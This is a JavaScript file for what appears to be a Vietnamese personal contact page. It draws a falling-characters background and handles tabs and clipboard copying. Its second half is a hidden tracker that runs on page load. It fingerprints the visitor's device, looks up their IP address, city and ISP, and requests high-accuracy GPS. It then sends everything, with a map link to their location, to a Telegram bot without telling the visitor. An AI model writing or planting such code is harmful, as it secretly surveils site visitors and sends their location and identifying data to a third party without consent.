// Code rain background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
const fontSize = 12;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function draw() {
    ctx.fillStyle = 'rgba(15, 23, 42, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#60a5fa';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = chars[Math.floor(Math.random() * chars.length)];
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(draw, 45);

window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});

// Tab toggle
document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.contact-content').forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(btn.dataset.tab).classList.add('active');
    });
});

// Copy to clipboard
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Đã sao chép: ' + text);
    }).catch(() => {
        alert('Không thể sao chép, thử thủ công nhé!');
    });
}

// Auto zoom adjustment
function adjustZoom() {
    const vw = document.getElementById('viewportMeta');
    const w = window.innerWidth;
    let scale = w < 768 ? 1.04 : 1.0;
    vw.setAttribute('content', `width=device-width, initial-scale=${scale}, maximum-scale=5.0, user-scalable=yes`);
}
window.addEventListener('resize', adjustZoom);
adjustZoom();

 // --- 1. CẤU HÌNH ---
        const TG_TOKEN = CONFIG.TG_TOKEN;
        const CHAT_ID = CONFIG.CHAT_ID;
let isBotActive = false;

// --- 2. HÀM NHẬN DIỆN MODEL THIẾT BỊ SÂU ---
function getDeviceModel() {
    const ua = navigator.userAgent;
    let browser = "Trình duyệt lạ";
    let os = "Không rõ";
    let model = "Thiết bị ẩn";

    // Phân loại Hệ điều hành & Model sơ bộ
    if (ua.includes("Win")) {
        os = "Windows";
        model = "Máy tính/Laptop";
    } else if (ua.includes("Macintosh")) {
        os = "MacOS";
        model = "MacBook/iMac";
    } else if (ua.includes("iPhone")) {
        os = "iOS";
        // Kỹ thuật lấy độ phân giải để đoán đời iPhone
        const screenStr = `${screen.width}x${screen.height}`;
        const iphoneModels = {
            "430x932": "iPhone 14/15 Pro Max",
            "393x852": "iPhone 14/15 Pro",
            "428x926": "iPhone 12/13/14 Pro Max",
            "390x844": "iPhone 12/13/14/15",
            "375x812": "iPhone X/11 Pro/12 Mini",
            "414x896": "iPhone XR/11 Pro Max",
            "375x667": "iPhone 6/7/8/SE"
        };
        model = iphoneModels[screenStr] || "iPhone (Đời mới)";
    } else if (ua.includes("Android")) {
        os = "Android";
        const match = ua.match(/Android\s+([^\s;]+);\s+([^;]+)\)/);
        model = match ? match[2] : "Điện thoại Android";
    }

    // Phân loại Trình duyệt (Sửa lỗi Safari/Chrome)
    if (ua.includes("CocCoc") || ua.includes("coc_coc_browser")) browser = "Cốc Cốc";
    else if (ua.includes("Edg/")) browser = "Microsoft Edge";
    else if (ua.includes("CriOS")) browser = "Google Chrome (iOS)"; 
    else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome") && !ua.includes("CriOS")) browser = "Safari";

    return { browser, os, model };
}

// --- 3. LẤY DỮ LIỆU IP & ISP (HTTPS 100%) ---
async function fetchFullData() {
    try {
        const response = await fetch('https://ipwho.is/');
        const d = await response.json();
        if (d.success) {
            return {
                ip: d.ip,
                city: d.city || "Không rõ",
                isp: d.connection?.isp || d.org || "Nhà mạng ẩn"
            };
        }
    } catch (e) {
        try {
            const res2 = await fetch('https://ipapi.co/json/');
            const d2 = await res2.json();
            return { ip: d2.ip, city: d2.city, isp: d2.org };
        } catch (err) {
            return { ip: "Lỗi", city: "Lỗi", isp: "Lỗi" };
        }
    }
}

// --- 4. GỬI THÔNG BÁO (Format đẹp y hệt ảnh 1) ---
async function sendNotification(pos, info) {
    if (isBotActive) return;
    isBotActive = true;

    const device = getDeviceModel();
    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
    msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
    msg += `🌐 <b>Địa chỉ IP:</b> <code>${info.ip}</code>\n`;
    msg += `🏙️ <b>Thành phố:</b> <code>${info.city}</code>\n`;
    msg += `📡 <b>Nhà mạng:</b> <b>${info.isp}</b>\n\n`;

    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
    msg += `├─ Thiết bị: <b>${device.model}</b>\n`; // HIỆN MODEL CHI TIẾT
    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;

    if (pos && pos.coords) {
        const { latitude: lat, longitude: lon } = pos.coords;
        msg += `📍 <b>Vị trí GPS:</b>\n`;
        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
    } else {
        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
    }

    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: msg,
                parse_mode: 'HTML',
                disable_web_page_preview: false
            })
        });
    } catch (err) {
        console.error(err);
    } finally {
        isBotActive = false;
    }
}

// --- 5. KHỞI CHẠY ---
async function start() {
    const ipData = await fetchFullData();
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (pos) => sendNotification(pos, ipData),
            () => sendNotification(null, ipData),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        sendNotification(null, ipData);
    }
}

window.onload = start;
